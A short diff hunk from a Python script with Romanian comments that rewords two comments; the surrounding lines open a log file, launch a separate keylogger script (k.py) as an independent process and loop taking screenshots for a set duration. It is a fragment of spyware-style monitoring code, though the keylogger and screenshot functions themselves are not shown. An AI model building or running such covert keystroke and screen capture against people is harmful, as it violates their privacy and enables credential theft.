@@ -35,9 +35,10 @@ f = open(directory_path + "\\log.txt", 'w')
 f.close()
 
 #Lansarea procesului keylogger
-kProcess = subprocess.Popen(['python', 'k.py'], shell = True ) # use shell to have an independent process
+kProcess = subprocess.Popen(['python', 'k.py'], shell = True ) 
+# use shell to have an independent process
 
-#Intram in folderul creat si incepem executia
+#Accesam folderul creat si incepem executia
 screenshoots_path = directory_path + "\\"
 while ss_contor < time_alive :
     takeSS()
